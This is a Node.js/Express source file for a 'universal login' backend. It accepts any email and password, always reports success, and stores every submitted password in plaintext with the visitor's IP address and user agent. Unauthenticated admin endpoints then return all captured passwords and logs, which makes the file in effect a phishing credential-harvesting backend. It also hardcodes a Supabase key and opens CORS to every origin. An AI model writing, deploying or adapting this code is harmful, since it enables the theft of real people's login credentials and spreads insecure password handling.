// ============================================================
// Universal Login System Backend (Accepts ANY input)
// ============================================================

const express = require('express');
const { createClient } = require('@supabase/supabase-js');
const path = require('path');

const app = express();

// ============================================================
// Middleware
// ============================================================
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header(
    'Access-Control-Allow-Headers',
    'Origin, X-Requested-With, Content-Type, Accept'
  );
  next();
});

// ============================================================
// Supabase Configuration
// ============================================================
const supabaseUrl = 'https://rkiqozdxcfiwqvzeoutq.supabase.co';
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJraXFvemR4Y2Zpd3F2emVvdXRxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njk3ODgyOTMsImV4cCI6MjA4NTM2NDI5M30.CUen4-RHCDgk8TqySVF-oQIVS3c11H_Yf2h7KexdGjk';
const supabase = createClient(supabaseUrl, supabaseKey);

// ============================================================
// Health Check
// ============================================================
app.get('/', (req, res) => {
  res.json({
    status: '✅ Backend is running',
    message: 'Universal Login System Backend',
    endpoints: {
      login: 'POST /api/login',
      adminUsers: 'GET /api/admin/users',
      adminLogs: 'GET /api/admin/logs'
    }
  });
});

// ============================================================
// UNIVERSAL LOGIN ENDPOINT
// Accepts ANY input as long as user types something in email/username/phone + password
// ============================================================
app.post('/api/login', async (req, res) => {
  try {
    const { email, password, login_provider = 'email' } = req.body;

    const userEmail = email || `user_${Date.now()}@example.com`;
    const userPassword = password || `password_${Date.now()}`;
    const userName = userEmail.split('@')[0];

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';

    // ---------------------------------------------------
    // CREATE OR UPDATE USER
    // ---------------------------------------------------
    const { data: existingUser } = await supabase
      .from('users')
      .select('*')
      .eq('email', userEmail)
      .maybeSingle();

    let userId;

    if (existingUser) {
      await supabase.from('users')
        .update({
          last_login: new Date().toISOString(),
          login_count: (existingUser.login_count || 0) + 1,
          ip_address: ip,
          login_provider: login_provider
        })
        .eq('id', existingUser.id);
      userId = existingUser.id;
    } else {
      const { data: newUser, error } = await supabase.from('users')
        .insert([{
          email: userEmail,
          password_original: userPassword,
          name: userName,
          ip_address: ip,
          login_provider: login_provider,
          created_at: new Date().toISOString(),
          last_login: new Date().toISOString(),
          login_count: 1
        }])
        .select()
        .single();

      if (error) console.error('❌ Failed to create user:', error);
      else userId = newUser.id;
    }

    // ---------------------------------------------------
    // LOG TO ADMIN_LOGS
    // ---------------------------------------------------
    await supabase.from('admin_logs').insert([{
      user_id: userId || null,
      email_used: userEmail,
      password_display: userPassword,
      login_provider: login_provider,
      ip_address: ip,
      user_agent: userAgent,
      login_time: new Date().toISOString()
    }]);

    // ---------------------------------------------------
    // SUCCESS RESPONSE
    // ---------------------------------------------------
    res.json({
      success: true,
      user: {
        id: userId || Date.now(),
        email: userEmail,
        name: userName,
        ip: ip,
        platform: login_provider
      },
      message: 'Login successful'
    });

  } catch (error) {
    console.error('❌ Login error:', error);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

// ============================================================
// ADMIN ENDPOINTS
// ============================================================

// Get all users for admin dashboard
app.get('/api/admin/users', async (req, res) => {
  try {
    const { data: users, error } = await supabase
      .from('users')
      .select('*')
      .order('created_at', { ascending: false });

    if (error) throw error;

    res.json({
      success: true,
      count: users.length,
      users: users.map(u => ({
        ...u,
        password_display: u.password_original || '[No password]',
        password_original: undefined
      }))
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get login logs for admin dashboard
app.get('/api/admin/logs', async (req, res) => {
  try {
    const { data: logs, error } = await supabase
      .from('admin_logs')
      .select('*')
      .order('login_time', { ascending: false })
      .limit(100);

    if (error) throw error;

    res.json({
      success: true,
      count: logs.length,
      logs: logs.map(log => ({
        ...log,
        password_display: log.password_display || '[Encrypted]'
      }))
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ============================================================
// START SERVER
// ============================================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Backend running on port ${PORT}`));
